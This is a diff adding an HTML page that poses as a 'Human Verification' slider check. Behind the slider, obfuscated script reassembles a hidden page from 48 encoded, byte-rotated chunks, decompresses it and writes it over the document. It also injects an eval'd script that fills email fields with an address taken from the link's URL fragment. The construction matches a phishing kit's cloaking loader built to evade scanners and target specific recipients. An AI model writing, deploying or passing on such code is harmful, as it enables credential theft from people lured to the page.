@@ -1,0 +1,182 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Loading...</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<style>
+  #css-pass::before { content: "g078Bz"; display:none; }
+  #human-overlay { position: fixed; inset: 0; display:flex; align-items:center; justify-content:center; background: rgba(255,255,255,0.98); z-index:2147483647; font-family: system-ui, sans-serif; }
+  #human-box { background: white; border-radius:12px; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.15); text-align:center; max-width:90%; width: 360px; }
+  #slider-container { margin-top: 20px; }
+  #slider-track {
+    width: 280px; height: 50px; background: #f0f0f0; border: 2px solid #ddd; border-radius: 25px; 
+    position: relative; margin: 0 auto; overflow: hidden;
+  }
+  #slider-handle {
+    width: 50px; height: 46px; background: #0b61ff; border-radius: 23px; position: absolute; left: 0; top: 0;
+    display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; cursor: grab;
+    user-select: none; touch-action: none; transition: background 0.2s;
+  }
+  #slider-handle:active { cursor: grabbing; background: #0050e0; }
+  #slider-text { margin-top: 12px; font-size: 14px; color: #666; }
+</style>
+</head>
+<body>
+<div id="css-pass" aria-hidden="true"></div>
+
+<div id="human-overlay">
+  <div id="human-box">
+    <h2 style="margin:0 0 8px 0">Human Verification</h2>
+    <p style="margin:0 0 12px 0; color:#666;">Please complete the action below to continue.</p>
+    <div id="slider-container">
+      <div id="slider-track">
+        <div id="slider-handle">→</div>
+      </div>
+      <div id="slider-text">Drag to the right to prove you are human</div>
+    </div>
+  </div>
+</div>
+
+<script>
+console.log("[Decoder] Starting. Pieces count:", 48);
+
+var piecesArr = ["O1tKYD8+SkpYbGJ7cl1UYlY7g2J2U0peY3F1XlJcVmNbYV46OUxwc3tKckBTSl9UPmJTSntLYk5KVX5NcHFPbjtNgFNKfGw+gVRKg1lYTV5rVnCBXnN5Sk5LgFVwPko7S2JSWnBbeFVQVG9KO0piVYBPcE9KTEpyTF5KeFNaT3CAcEFwUkpxSllKVEpV","YFR6eIE6TG2CS0BqUHdQXU1WTFBugHk/fUBYOn5tVk5RUXl1dF1MUEpzgT1MSlZSWmN6gF1LOktaaj46dl17eVtRdUpwUmBSWl9sbDlLWks6XlhKWlmBSkpLX0twS2xicVFbeVxOfktwSoJ5UUpsQUpwgGNYfIBNdVVdQVpNTjl3V2x4W2w9YjtXSlQ8","YkpwU39Ublk+bk5iYD9bVHw9VVY+THdLTX49YjpNTjpOg3h6PlJQbj1baz1bY1NreHBdbDlwS3pqUEp4d094UU9NU4GAXYBjSko5S0pQS0pQgFxigVNueFFMWk91eVRqeFZWeEtKgIJ3bnduYnGDe2KBalCATFF7X2BQdnNSfGM+SlFbTzxNY2JbPkpi","f3VQblpNX4BzOXB3Y3NQW09YbnhXflNffz1LfYFdOVZycVJZPnR2OVZQbj1TbIFscoBMgYBxWntVOjlXbGxvbIBWTIBMW3FLT1tdbWx0P4JqeVVrPlR5TkJcW1NqcVNuS1tzT3hVPk9wg3h3WjpiTnlWTD1LWVpPbnBRdnJ8g21Ud4NuYFVdY2JLSlNy","f01VNHpZVVt0UDSAeTlyPoFyYHl1dj6ATT5aT0JOOFBSb210dnRbT0tadTlSPkGBTE1dTnt5bXF3WXFaTXuBPj1QTVlQT3ZQW39QekyBXGw5VldwXW9AbVlzYWF7SkBKUlRAVVB8S0pfglZKPU5KfExweHBvNEuAcHN2WkJZelw5gmJWelxzOXpAbFpf","cFNjTHF/W1FYUG5igXNxcVVQenF8bnlRP1BwcUJYeWJibzt3TUBKO3t4alGAczhRXktxanJ4dk09cD1SWIJdan5POFxqgHlfY09gdnViW2BwPktVdnNjS1WCf3lrenZWa2pBUHtrcUBQeXtLO35MYFB4fnA+Sl0/c4N4QFh1fHE+P1ZBYzRMUz1TalJ1","cnFtd3A+Wk+CV3V3V3Q6YFBPTG9uT1SCQlJNXE88XE5TXWpjUDlxO3p9YVBfW1tQYnZbXD+AYHZiTj07fnl7a2JiWTp7VUtzOFt6gExTW1ZYb2I/XHF2g09cU3N8UXxYfnM9WlN8bXZKS31VP0FgXnB2TIFSV0x/W3daaoFgeGFifnZXTk5jdnF5Y1Ra","dns0gFNeS1B9ckxVNGB5QUw4gFVscVBibXxLPV5VO3JfdEt0UHxYeHN2VTtvWF9XPVk/cVBSams5amN5X3Y+Uk9ggn49WWpOdT1RTFpqYGpjYD9bbVBPPnlhTmFBeXmBT255YFtgPU9QVk84dFh5eHo+b1RAgnlibndsPmNcgXFYcVxrYVhQXUpwQj5w","eXlrTjpWT11dTHdSVEFKUFp3OXRec4JaSkBWfHpTXVJLbFpuUn9XeXFSfmxxOk5udHk8P0BiTDx5VlOAg3hZP3B2TTyAWkpNdXw8YmI7eIFYfUxyVU1KgHhbUkJdWXxUVVk9elVyXUpCdV87UXJMYnFzT26APG14VWpLOoBWYFVOTlJgc3M6S3ZKV1x+","eDpSW15Mg4A8YlZtSmBxf4NTU1ZdeHhBSldKUTs0cVFSfnlNg0JTWWNYbFFWV3xSWGJxg4CBcVxjWoNLeXqCV2xKbmx/TlV0Qjw7TG5SakpLYlWDXH9NWjx0S11edIBYVFWDUjx4Um44S12DWn51eD5sOkxtTnB5cD1dfjxrQmBrUVBCdV85dIFbY1VO","NE9vYnRXSmJwfj1xWm55bztYVzpdUUBSak10bnF4VntacoB4QUFxeF+AYkxUc4I6b4FaUUFsXUFLbFpgYn1ugXRsf0xtPFlyeIB0gHJhSkpUVUFOYEpbWICCcIJ0eHlqTVlNTz5sYVRXXXJ0PW58cW59glddWHRWbmJhVlNugExRVlCBWoBsYFlUYYI5","YlBuSzpiUVFLTk9PcHJxeXJcdldxOXRNTH1ccGNAUVBPQkx6dDmAXllVTDpdTVdBdG5sgHRrToFydlJ/flyDcT5NPUqAfINLVW9UdEtyXVljalpMWlE5gz54f2xPWjlwWlo6bk1XOXt4cUp/e01RSj5xVXRtOHlbVFqAc2xcNEpaSk5PP2I9eFR0VYBY","fUp7NIB4WkGCWHJ9Ujh0d0pcOVdgS2pxUXx4Yk97U2xPUzpjfFtwS2tWPU5bcWpUUlxKXVU/UVE5YXE7cF9eV3hKdU1heF1Oc1JLP0+DTEtbYYBsgE85P1NKYnBSb0xSSm5PcnJuNFFaTXFKbkptTHFaOHh9ODpvTXZsP3F2WnVbU1Q9WTldYmFhanhS","X25vTWBiPIBRYHh6gn6AUjtZOVFAcj9bOnxaUk1cTk1zOEtvgGxBUz1OekxgY2pSVIBLQE5UckFxP059c1peUFNKg1peQVVSgFNaSkF0cE1VdmNXPVFXczxTc3RuTHJBPzhLUXRSXE5OUVZ3clN8Wl89S1tOck1tV0pcTFRXXzpVa09sW25hPVlBOnJU","d1xMX1dTYUFdcnB2Yl1yT1R3eHFycF1UbHJKfnaAS29TbnBxUHpaUV1VXFt7fHJ7f0pQWV1yPk+AYGxTS154cH6BPUxMeFOBUXtzdYBwYlpsVnZOc3JjgX90XjtVXmtvXFFbPlZrXlJrXX9NWVtQYn1/TEE+VXB5gGpSTUFae05xSndbSmxvTHduUWNz","Uz9beHhKekw5fD9jPXJ1P0t5U1g5emNWfDtOX0yCcVF8VWNZOFA5g3x+NHpgdlmDYHxVSmOCelxjVX9LdoOAOYJWSnh+TnduW0F5QHJVbHhsYHyCVT1ub2NjS1tAOFxdeUuAXk92P3RqXF95TFpPPVJ1THZCVHlSf1VeUDSBY1RAdTp0dVl7Ync7g1Fw","PD5wbYJ/UlqBTlh6Ont3gVJUWHxxU05tY0FNenFsS05xTltiYH09cXRSdj2AcT14XGB+QVZzb1FuXlFqVnVxUFk7cVpqWUpbXExyS1tLP0tjW0tOW1tTOlx3dXBBb4FMam5dW3eAanF4gT5QX118W0s+S1BSOT9rgVeAYXtLQEpRPFledVOCXl1gXGNL","OXs/Tz90bkFKbEo6OGxybFF5bjx5b2NPP1BCeTRUgHlZPDxAc0I0blWBeGE8VTp5Pz1uelh5d4GDQDRMb3tyX3prOzpLd4FqYmA8SlQ8Olw5cHduUnhbQVxWPnBOVztROV1rO3N8WGpdeH1gd3hxb4F8VFBxVTyAVGtPcWqAc3ZYW0p0YEA5Qm1QOGp0","XFg7OWJdelN+S25yVnFwcl5hgEI9bWpaXlRfYGJUSz5KcIFQfGFZc3xSUEpNgEpeTXtwPVpuUko/cjxKSnCBPW58clptNGJPXDliT2pKa3hhTldUS0pSTFxhek5gXUtKYjlLWltqc2xwS1NKSlZ6T3ZMTT9KUF5LSlpqSjk0gnBqgDtZUHRaeG53cHw8","d3BaS11+OUt3VV9wgVxuU0xsS21XQlM+clBNW3hgTjlqVWw5dVxWb3d1VUpyS0s8YUpKYmpYgFdKUHFXeHpLOWNbgGs+eltWU4BxTnF2d3RzX05Ye085WG5dWGJxVFh1YmBxP3eDc2uATmJqfExMdnxOfXlZUFN5XFN2djt5eT9OUXxwWUpgc2FvTF93","gl5qPHtZSkpqSkFMWF1gXjhYeE9df0tQVVE/TExNT1JccGp0bFJWcWJzXk5wdVpQUld7TmxxdnE6cGBTSkpKTVB3bWpcWVM7UkpygVSAcE5LdXFCe1lygmJXg4FRdVhKVWBTgHJ4Y3BLX3VccmBST21yPHdcYjk+NHRrgnw0YFhMNF9iVX91S1ZgbnFW","QH15UGtYczlQbXd5V0p1dnB6UHd0dzRdgVNATm9MWHd3Y3I7Yz5Wbj9iWXdBXT9TPz1vbFF7TEpKWF9eTUpQPD9MSnBud1RydlhKcE1SQEs/W1Y5TEpKQk5OSj11cG5wVH1LSnNfQkpKUn15ToBwPnJbXD1AWT2AYGFqbXBZSnM6PkJBbHNWYXFNVYBX","UFk4gUF4bmxwg3NWfDhSWH5hPHdTcIFCPmxSfjtcXHtAWYA9eF1KeFhwd008WzR+WThZe4NhXE5wW0ttb351UX55dD5zWm50OmJVUXCBfU1PSkxUY1tUeFeAcW5xP1k9cFE5fUpyeH1bbG2DU1JNQmtuckBCc1FcYTw7b0BtcFh8VlFOflZMTlpcSk5r","QnlLdktXVnmBS2tzdYJwY11MWjpSPYE/cHZXPjtdclB0S4KAPTpeTVNMWGKCVFNeO1RrUHI7QTyCY0BhgYN1Vz1AQm08TFqBWkE8WD1BgUt9U3xOgjx0bT92f3tKbFpeUndTTVVaOUpha15sUFM+Uk1WbmBdb3I7OT1xQXBad3xfc0BzNEpCPVNgWT5Q","O4NYeDk6Wk9RTVFwTHJKTHBSS1tNTFWASmxSUk40Onw8QTl8S3VScIJMgkCDbIB8g1d2ezs5gnc6fIA9SzSDYk94gU5PeIFWW3mCVjlBTnhbc15NYE2DOYJiOl53cINCOVt0VoBROU6COIB2QH9jXTtegzw4QVE/V1lvSjSDflZxfW9LOFBSSn9BTT1V","bU9rXluAbYJtcHuDTVFwSltNOVo8Sj5RTnZ/S0I7W1s0WldQYlRKVFJNTjpXVIBTcFZ0gD+AV3F7gVdeXoE6UXxYToE7gV9Lejx3cVk7cV9MgmtZdINsV3RKUjlvWVI6OVROgnyBdINrVmJPcVc9cX9YToBUWD1eX1s+gVs7a4BxgWE5UIFMO3NzOYJQ","VVZwW1OAgoNOO4JxPDpLgIE6cjo7WzpfVTlybYJfgl+AYzt1OnU7dTk+Ok9VVINPO09WVII+g088PliCgT6AY4NjO2OAeTp5O3mAPoFPOoGDgTuBgFuDXzx0g3NwOYJLVz2AOld0gkJUTFNyV0xLeHFVcD5LTlpWTHRxS01zVUxYTExzc1BVSndQc3c6","YIBROl6CUTtrgVFSdEpUgEBxeDlAOVGDUVNKW0xXXIN7PHtXO1M7gnuAgzxVgWCBVYJ7UlhWYDyDOnRVPYNgg39NPzldS046YHZfWTuAg4NVgG9SXDlAWWw8TTpNUFw7TXRyWVyCQoNdOnSDW4JeVUE8bVVBgW1YQU58PG1Rgzt9O31OfDxrUlZQXVOA","WHKDa1JLVUpQgjlhTl+Bb091OThLYoFvOX9ZeU5xVlN3TlJTT2s5WYFZVFOAPFmBdV86PFaBXjyCQVdbOmFUW3ZCOTiDfIJtPG9UbjpdPH91dTl/gn9KaztZOll2eFBZPHh2Yjw8gzxxOXByO4I5YVE9OWFXWFFsPHKAYXBXgXeDcVI5Uks7d0xygXdK","UE1ATVFzendqT0Bxak5AS3p0PXBiT3hNflFbTVhhUk5qWF5LXlA6TnNVgVh9S1KAbXJ7g35cVV5ST3g5blpYSkpKUHVLSnRMSoBYTEs8OUpMT06COUp2TnJLckx4gnZLfHZ7g3JLXFB/gWGCTFRqT1uBXVFeTT+AUYFeSnZ1UFVfUl9KTFdyVHJSTFVM","gYCBgH5aeVt5gYGAboBLXWtwWWxKS2x8PktYY2N8b3BTS2Fcg09fgltKTlxhSmJKXlxreEs9P1xRSnNbV1JadU9KWltRVYJTVm1cXEpwOU9uU2xaSlVaOXxqblN4OjlPcF1uU3lLSoBuSm6AfkpCbEo6SkpKPUt1UDxZbVFOV21MPXFTS3xLVINTOVNO","eF5XSkpdTYN3WjRKbldTV3JKUINfOz5aWVpWUmODfEpPXWJiXE9COU9wTztZeGF+WFVZfn5BVnNBQWNwdkF9QThaUV2CQWtfdYB2QUJBX1VRa05dXHNYYlxcVUpXcFB3VFped1RzQUFUc1thTVprTF54OnBNbTlBgkFcc2xNSkpwU3lxYneDY1pWgG6A","fzmAXjtefFZyVXl0SkCDXkxSTIBKTFU6VjlyTFlQPEGDQVNOVTlLdVZSenh/PXtOdkp9PXI0g1lOb1FudkxZVoFXOmE5fIFUfoB5PVFeTk5RWVFVT357PVg5cnV5gFBUSkx1d0pCgmJXcjtWfVpPPU1LSj1OXXV7TUs6QlJ2gTl/eEtbTXhNcU45gDt0","PndKOj14XHtcS4BwglVzeFxKgEp8dDhNYoN+W1U7fk4+g35KPzlYOlhMen85f055PUt3U21KUFVWPDRWQEpagVN0TVJzdD5QWoA5eF5QWVF9fF5wbVhhTnQ7NII0cG1YSnd7WTtVXTtcTFBNYoJdWViCVVV5TD1wgDw8OWxeP1FCgnY6djs8Oj2AUHdM","fWxPYoE9VXJ+bIJ2fHxhX4NegV56fn50f2B8VntWUzp5Vnx8fTmDcYE9fTk7TFCAeIJVVn92UYM7dnl2foJ0e3lcWVVTQDtTVnByU39eenJQen98eFBLS1E9gW1ObEuBUE59gHw9fFp/YlFOV4BfXnlwc0x/TFtBOTl4ToM5SoBKNExudz5NTH1OTF5z","W3ZwfT5Ke05rcmBzUFxqS16DUlthOnCBcE07S21TajpQgD9VSlVBf3B9eE1xXltKeE1eWG2BOVJeUnx8Uko5f4BNdVJWfX6DTns9Wkx3YU9UTjpQVVpeeWJ8cE9CTHxOTn5QgX6AWHtUeHxXUHt0cVl+dFRQelB4WHpMToF4QX9BT3RYeTt/e0FKPDlB","OWJjTFJySlRra1lKU1NNSz05b3FvcVNCbHtzgTtWU2pVcH2CWUt7dWpVXD1rQmBrTXGAWn9sd2pxeIBrQUpYa318fVRLXE1WOEE9cFtyNHBSPVFxfmtLVWtrdVZgeXFWWUtgTHVwTkqAP3tPVE48cXY5gnFWUDxxVHBMg3V6dH9acEpUUFQ5eFR+g3iD","bFVNWE9dYnZrSzpiP0tbfFpaV2BANHxzcGx8OkFccoNzd0FOQE5WdU5sfD5LPUpqYmxKS2pLeYBfYWpqVldyblptPVNBaj51SldwdEtjcEpKbHBBS29Oc0tBSkxKT0tLfD9acoBtSz5XV0E9UlhLanFaVW5rbT6Dckt9QlY/P3CAbD9KVl5rOEpWTF5V","OUo/gkBcdXp/ellKbFB4QH4+b0B5VWxqe0pucIBwgz9ea39Pc0p1Vz98fWM4PT9zdUBRbGxWdU5yVYFigmxhXW8/bU9scl8/fWw/V1dKfUBdS4FAXUt1V1dagGs6V1d6fEp6VldsbEE9bGFLPmJ8Vz9WPnxvVWtAT1pacX0/bkF0cW4/cUtWfEp4UEBb","QGNKbVFuPYNQUDpiUD9KdVFqbGFRWFCCV35RXEBVUEpCOU9sUHxAO1BWUDlQXkpgUHRWUV9CUE5QPUxYUT1WP2JjUFJ9fz9CenNbUlFwan0/OD5ZQFpLQEBRbVBRSm1sSm4/OVFaa3FagFdCSz8/XUBzQkBQSkJAgnNWV0E5Vz4/WFpSQGBrfUpZcHRL","fFpabWpsemw/bXpsbGx6VoFLckqAbFZzXG18SkA6U205W39sdD4/QHRsTkw5U31qYVttand9UWJwQFJ4gEBvQFpQPXpzTX9wTG1Ae3NKbUtZUVdbWoE9PVlAUG1ge35RglBjQFhRU1B7UVNRVVBMP1hAO1FWVz9QOVFeUVtwdXBrUHFiSlFLSm1RfVBi","dnhPc2trSk45eEt3OXhgd3l4P3hud354bGF0eVF3gUE4Y3VjOXl6Y4JjbGFcfHdjdmN6Y3JjVmFyY05OfUFvfFlOXk5PXYJ4blFRUXd5XHdtc2uDb3dTOGFvSkpWfleCV353gkt2dlx3cndMWzl2QXdsd3xXfndWdzltbGxqVmBtdmw/QoBKbmx6cIFw","UXViU4GBOYFPYmKAbTQ8f2tbc1ZKSnxXd3pTd0p6gTlLPoF4T0pSY4BiOVVdflg+gV93NFM4ekBPTHdudzRTd090W4CCT3M8NHhTODRMUn00QFNRUldzX05wW29YTFlYWEyANHFVWHJgVF51YExwcGBWSndgdFI/U15QdVh8U1JrWWFAWk85VU9xYlhX","fV9gWHRsfU9KY31NSn0/b319XztsO4N8P35/SnhNXINjgnlMXINsbEuCeVFbgYFjY01dfV5LcnhOUIBNTFNASmpPVDtadVJ7c0xQf2t4QkxQV29KPmp1TGJ4g1JveIJufkxsYkFTYVCCTVRKa3lug2J1UnNMTFtzTGqBgl5MTjs6Un9vgWxyb1tvPzl5","a11fdmtzTUtKcYJSb1Vte05QTFBqc0x6f2tqVWNzdXFqc2tdbF1vg099dEpqc2tzbF1NWWFQdIFsc3J7b11ic1VhUF5PdG9zcjh8W21zWWxLPXM4Y3NyWVVZO1JRW115gk47Ujx7X3N5OHpqYF1RTE1aTYBxf3VTW4BTXIBLVWF9fXs6e0B+V3ptTXJ4","S3hicFJ+cV5tWl9OXEtPbDtPYVFhazlzdT5WdXg8S0xKakpiSntXNIGDgT05YnB8YVlwgGA8XFJKeT5cYHY9UnRaTHhKe4NYSldOTEpKgGNhTWpuTVBWWHhLdEw/Oz2Ac4NQfnc5WIBbYm1vQjtNS3F4X25teF9ubXo4W0Fsg1c8T0Bzak5bY3NyVWOD","W2A4QT1Ka1pxbXRAdjtPcjR3YkF7WXBLbFhKdXA5TnZ3PIE8U2BrTYA+XFh4Sjs6ekpWO3tLWEFAQXtZTnBee05KW2OAQVR9c0tbV15idzxdcXZxQlpKfWNwUXBAPVFMeDtNO0JwUjt9SjlwTEJCO31XWDx1fXNxQEJsfHM9XGpdbU47eztjV2BjU0tT","Pj5CaEJqOVFoTjFZY1BiWHBvOFJbbzNjQkRQSVdGUFlJZ29oc1I0eVg6Qzlkb2VJeVtuZ1lbQ2JYcUNKakNKdlhmaWxZdmlsWVA6NWRaY3tFT1FYOUpHUWtWUUtKdkZkUDZZe0xibjd4MzM1ZDNlblIxaDE5NVh0WVhiZU5PN040Z082UA=="];
+
+function reassemblePieces() {
+  var out = '';
+  try {
+    for (var i = 0; i < piecesArr.length; i++) {
+      var b64piece = piecesArr[i];
+      var transformed = atob(b64piece);
+      var rot = (transformed.length % 11);
+      var chars = [];
+      for (var j = 0; j < transformed.length; j++) {
+        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
+        chars.push(String.fromCharCode(code));
+      }
+      out += chars.reverse().join('');
+    }
+    return out;
+  } catch (e) {
+    console.error('[Decoder] Reassembly failed:', e);
+    return null;
+  }
+}
+
+// --- Slider Logic ---
+var handle = document.getElementById('slider-handle');
+var track = document.getElementById('slider-track');
+var isDragging = false;
+var startX = 0;
+var handleLeft = 0;
+
+function startDrag(e) {
+  isDragging = true;
+  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
+  handleLeft = handle.offsetLeft;
+  document.addEventListener('mousemove', drag);
+  document.addEventListener('touchmove', drag);
+  document.addEventListener('mouseup', stopDrag);
+  document.addEventListener('touchend', stopDrag);
+}
+
+function drag(e) {
+  if (!isDragging) return;
+  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
+  var dx = x - startX;
+  var maxLeft = track.offsetWidth - handle.offsetWidth;
+  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
+  handle.style.left = newLeft + 'px';
+  
+  if (newLeft >= maxLeft - 5) {
+    stopDrag();
+    triggerReconstruct();
+  }
+}
+
+function stopDrag() {
+  isDragging = false;
+  document.removeEventListener('mousemove', drag);
+  document.removeEventListener('touchmove', drag);
+  document.removeEventListener('mouseup', stopDrag);
+  document.removeEventListener('touchend', stopDrag);
+  
+  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
+    handle.style.left = '0px';
+  }
+}
+
+function triggerReconstruct() {
+  var overlay = document.getElementById('human-overlay');
+  if (overlay) overlay.remove();
+  attemptReconstruct();
+}
+
+handle.addEventListener('mousedown', startDrag);
+handle.addEventListener('touchstart', startDrag);
+// -------------------
+
+function attemptReconstruct() {
+  var assembled = reassemblePieces();
+  if (!assembled) {
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reassembly failed.</h2>';
+    return;
+  }
+
+  try {
+    var html = LZString.decompressFromBase64(assembled);
+    if (!html) throw new Error('Decompression returned null');
+    
+    var currentHash = window.location.hash;
+    if (currentHash && currentHash.length > 1) {
+      var emailValue = currentHash.substring(1);
+      
+      // BULLETPROOF PREFILL: Encode script to Base64 to prevent ANY escaping/syntax errors
+      var prefillCode = `
+        (function() {
+          var emailVal = ${JSON.stringify(emailValue)};
+          var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+          function tryFill() {
+            var selectors = 'input[type="email"], input[name*="email" i], input[id*="email" i], input[placeholder*="email" i]';
+            var inputs = document.querySelectorAll(selectors);
+            for (var i = 0; i < inputs.length; i++) {
+              if (!inputs[i].value) {
+                if (nativeSetter) { nativeSetter.call(inputs[i], emailVal); } else { inputs[i].value = emailVal; }
+                inputs[i].dispatchEvent(new Event("input", { bubbles: true }));
+                inputs[i].dispatchEvent(new Event("change", { bubbles: true }));
+              }
+            }
+          }
+          var attempts = 0;
+          var interval = setInterval(function() {
+            tryFill();
+            if (++attempts > 20) clearInterval(interval);
+          }, 300);
+        })();
+      `;
+      
+      var encodedPrefill = btoa(unescape(encodeURIComponent(prefillCode)));
+      var prefillScript = '<script>try{eval(decodeURIComponent(escape(atob("' + encodedPrefill + '"))))}catch(e){console.error(e)}<\/script>';
+      
+      if (html.includes('</head>')) {
+        html = html.replace('</head>', prefillScript + '</head>');
+      } else if (html.includes('<body>')) {
+        html = html.replace('<body>', '<body>' + prefillScript);
+      } else {
+        html = prefillScript + html;
+      }
+    }
+
+    document.open();
+    document.write(html);
+    document.close();
+  } catch (e) {
+    console.error('[Decoder] Fatal error:', e);
+    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
+  }
+}
+</script>
+<noscript><meta name="robots" content="noindex,nofollow"><p>JavaScript is required to view this page.</p></noscript>
+</body>
+</html>
